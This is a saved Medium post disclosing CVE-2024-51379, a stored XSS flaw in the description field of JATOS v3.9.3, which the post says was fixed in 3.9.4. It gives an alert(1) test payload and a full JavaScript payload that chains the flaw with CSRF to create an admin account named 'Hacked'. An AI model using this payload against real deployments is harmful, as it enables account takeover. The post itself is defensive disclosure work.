=== Content from hacking-notes.medium.com_27131262_20250114_182454.html ===
[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2Fde49d0077a96&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderUser&source=---top_nav_layout_nav----------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fhacking-notes.medium.com%2Fcve-2024-51379-jatos-v3-9-3-stored-xss-description-component-de49d0077a96&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav-----------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fhacking-notes.medium.com%2Fcve-2024-51379-jatos-v3-9-3-stored-xss-description-component-de49d0077a96&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)
# CVE-2024–51379 | JATOS v3.9.3 Stored XSS | Description Component

[![Hacking Notes](https://miro.medium.com/v2/resize:fill:88:88/1*PNPZJB45mzMTgwk3wiUglQ.jpeg)](/?source=post_page---byline--de49d0077a96--------------------------------)

[Hacking Notes](/?source=post_page---byline--de49d0077a96--------------------------------)

·

[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F6c4ceca25a3b&operation=register&redirect=https%3A%2F%2Fhacking-notes.medium.com%2Fcve-2024-51379-jatos-v3-9-3-stored-xss-description-component-de49d0077a96&user=Hacking+Notes&userId=6c4ceca25a3b&source=post_page-6c4ceca25a3b--byline--de49d0077a96---------------------post_header-----------)

4 min read·Nov 5, 2024

--

Listen

Share

![]()
# Introduction to CVE-2024–51379

CVE-2024–51379 highlights a critical security vulnerability within the application that poses significant risks to user data and system integrity. This Stored XSS (Cross-Site Scripting) flaw enables an attacker to execute JavaScript in a user’s browser, leading to unauthorized actions and account takeover.

# What is JATOS

[JATOS](https://github.com/JATOS/JATOS) is a powerful web-based platform designed to conduct psychological experiments and surveys online. It enables researchers to create, distribute, and gather data from participants in a controlled environment, making it a versatile tool in the field of psychological research.

The platform boasts a user-friendly interface that allows researchers to set up experiments without requiring extensive programming knowledge, making it accessible to a broader audience. Additionally, JATOS supports multi-platform usage, enabling experiments to be run on various devices, including computers, tablets, and smartphones, which significantly expands participant reach.

One of the standout features of JATOS is its real-time data collection capability, which allows researchers to gather and analyze results efficiently. It also offers integration with other tools and platforms, providing flexibility in experimental design. As an open-source software, JATOS allows researchers to customize the platform according to their specific needs, further enhancing its utility.

JATOS was developed by [**Kristian Lange**](https://github.com/kristian-lange) and [**Elisa Filevich**](https://github.com/elisafilevich), who aimed to create an effective solution for online research. Speaking with Kristian, he made me understand that he is currently the only developer still maintaining JATOS. This is particularly impressive given the extensive capabilities of the platform and the demands of ongoing development and support. It’s an amazing achievement for a solo developer to sustain such a robust and widely used tool in the research community.

*I want to highlight that, thanks to the excellent collaboration with Kristian, the issues identified in this blog article have been successfully patched in version 3.9.4.*

# Exploitation Phase

Now that you clearly understand what JATOS is, let’s delve deeper into the specifics of this CVE and explore how an attacker might exploit it. We will begin by demonstrating a straightforward vulnerability and then illustrate a relevant use case in which an attacker could leverage this vulnerability against an administrator to gain elevated privileges.

## Simple Exploitation

To exploit the Stored XSS vulnerability in the description component of the study section, simply input `<script>alert(1)</script>`. Although the description field is designed to allow Markdown, it should not permit the execution of JavaScript. This is crucial because if a study containing such a payload is assigned to an admin, the admin could click on the description, unintentionally executing JavaScript written by a user in their browser.

![]()

A strong recommendation to address this issue is to sanitize the output. Once the input text is converted into fully rendered HTML, you can effectively apply the appropriate XSS filters to eliminate dangerous or malicious content. ([More Information](https://github.com/showdownjs/showdown/wiki/Markdown%27s-XSS-Vulnerability-%28and-how-to-mitigate-it%29))

## Attacker Scenario Exploiting the Vulnerability

This vulnerability could be exploited in conjunction with **CVE #3 | JATOS v3.9.3 CSRF | Admin Account Creation**, enabling a regular user to create a new admin account.

To achieve this, the user would first create a new study, add the administrator, and then include the following JavaScript snippet in the description section:

```
<script>
    function postRequestInIframe() {
      var form = document.createElement('form');
      form.method = 'POST';
      form.action = 'http://localhost:9000/jatos/user';
      form.target = 'postIframe';

      var usernameInput = document.createElement('input');
      usernameInput.type = 'hidden';
      usernameInput.name = 'username';
      usernameInput.value = 'Hacked';
      form.appendChild(usernameInput);

      var nameInput = document.createElement('input');
      nameInput.type = 'hidden';
      nameInput.name = 'name';
      nameInput.value = 'name123';
      form.appendChild(nameInput);

      var emailInput = document.createElement('input');
      emailInput.type = 'hidden';
      emailInput.name = 'email';
      emailInput.value = 'email@gmail.com';
      form.appendChild(emailInput);

      var authByLdapInput = document.createElement('input');
      authByLdapInput.type = 'hidden';
      authByLdapInput.name = 'authByLdap';
      authByLdapInput.value = 'false';
      form.appendChild(authByLdapInput);

      var passwordInput = document.createElement('input');
      passwordInput.type = 'hidden';
      passwordInput.name = 'password';
      passwordInput.value = 'password123';
      form.appendChild(passwordInput);

      document.body.appendChild(form);
      form.submit();

      document.body.removeChild(form);
    }

    // Trigger the first request immediately
    postRequestInIframe();

    // Wait 3 seconds and trigger the second request
    setTimeout(function postRequestInIframeaftertimeout() {
      var form = document.createElement('form');
      form.method = 'POST';
      form.action = 'http://localhost:9000/jatos/user/hacked/properties/role?role=ADMIN&value=true';
      form.target = 'postIframetimeout';

      document.body.appendChild(form);
      form.submit();

      document.body.removeChild(form);
    }, 3000); // Executes after 3000ms (3 seconds)
  </script>
```

When the administrator clicks on the description section of this study, two actions occur: first, a CSRF attack is executed to create a new user; second, another CSRF request is sent to grant that user administrative privileges.

![]()

This would enable the attacker to log in with the new account as an administrator, compromising the integrity, confidentiality, and availability of the application, particularly if any studies are removed.

# **Related CVE References**

* [CVE-2024–51380 | JATOS v3.9.3 Stored XSS | Properties Component](https://medium.com/p/44aea338ee9c)
* [CVE-2024–51381 | JATOS v3.9.3 CSRF | Admin Account Creation](https://medium.com/p/94035f24d0be)
* [CVE-2024–51382 | JATOS v3.9.3 CSRF | Admin Password Reset](https://medium.com/p/1adeff0386ed)
# Other References

For the latest updates on my developments and research, be sure to check out my [**GitHub profile**](https://github.com/Hacking-Notes).

--

--

[![Hacking Notes](https://miro.medium.com/v2/resize:fill:96:96/1*PNPZJB45mzMTgwk3wiUglQ.jpeg)](/?source=post_page---post_author_info--de49d0077a96--------------------------------)[![Hacking Notes](https://miro.medium.com/v2/resize:fill:128:128/1*PNPZJB45mzMTgwk3wiUglQ.jpeg)](/?source=post_page---post_author_info--de49d0077a96--------------------------------)Follow[## Written by Hacking Notes](/?source=post_page---post_author_info--de49d0077a96--------------------------------)[10 Followers](/followers?source=post_page---post_author_info--de49d0077a96--------------------------------)·[3 Following](/following?source=post_page---post_author_info--de49d0077a96--------------------------------)Follow
## No responses yet

[Help](https://help.medium.com/hc/en-us?source=post_page-----de49d0077a96--------------------------------)[Status](https://medium.statuspage.io/?source=post_page-----de49d0077a96--------------------------------)[About](https://medium.com/about?autoplay=1&source=post_page-----de49d0077a96--------------------------------)[Careers](https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----de49d0077a96--------------------------------)[Press](pressinquiries%40medium.com?source=post_page-----de49d0077a96--------------------------------)[Blog](https://blog.medium.com/?source=post_page-----de49d0077a96--------------------------------)[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----de49d0077a96--------------------------------)[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----de49d0077a96--------------------------------)[Text to speech](https://speechify.com/medium?source=post_page-----de49d0077a96--------------------------------)[Teams](https://medium.com/business?source=post_page-----de49d0077a96--------------------------------)


